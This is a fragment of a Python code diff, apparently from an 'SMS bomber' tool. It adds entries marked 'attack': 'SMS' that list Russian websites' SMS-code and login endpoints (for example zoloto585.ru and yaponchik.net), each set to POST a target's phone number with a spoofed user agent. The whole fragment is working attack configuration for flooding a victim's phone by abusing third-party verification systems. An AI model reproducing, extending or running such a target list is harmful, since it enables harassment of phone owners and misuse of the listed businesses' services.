+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Vladimir', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://vladimir.edostav.ru/site/CheckAuthLogin',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Xn---72-5cdaa0cclp5fkp4ew
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Xn---72-5cdaa0cclp5fkp4ew', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Xn--80aaispoxqe9b
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Xn--80aaispoxqe9b', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Yaponchik
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Yaponchik', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://yaponchik.net/login/login.php',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
+        # Zoloto585
+        {
+            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Zoloto585', 'anonymous': 'No'},
+            'method': 'post',
+            'url': 'https://zoloto585.ru/api/bcard/reg/',
+            'headers': user_agent()[0],
+            'data': {'phone': number},
+        },
     ]
